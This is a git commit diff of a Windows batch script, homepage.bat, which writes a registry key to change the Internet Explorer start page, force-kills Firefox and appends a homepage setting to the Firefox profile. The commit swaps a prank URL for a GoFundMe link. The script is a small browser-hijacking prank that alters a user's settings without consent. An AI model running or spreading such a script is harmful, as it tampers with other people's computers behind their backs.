b707f6a1e4c7c163e619c492615af9493dd849e5
marrobHD <marlon.otto@outlook.de>
2018-04-21 13:17:02 +0200

    Add files via upload

--- homepage.bat
+++ homepage.bat
@@ -1,12 +1,12 @@
 @Echo off
-REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"http://nowlookatthis.net/\" /F
+REG ADD \"HKCU\\SOFTWARE\\MICROSOFT\\INTERNET EXPLORER\\MAIN\\\" /V \"START PAGE\" /D \"https://www.gofundme.com/stefankarlstefansson/\" /F
 
 taskkill /im firefox.exe* /f
 
 cd /D "%APPDATA%\Mozilla\Firefox\Profiles"
 cd *.default
 set ffile=%cd%
-echo user_pref("browser.startup.homepage", "http://nowlookatthis.net/");>>"%ffile%\prefs.js"
+echo user_pref("browser.startup.homepage", "https://www.gofundme.com/stefankarlstefansson");>>"%ffile%\prefs.js"
 set ffile=
 cd %windir%
 exit
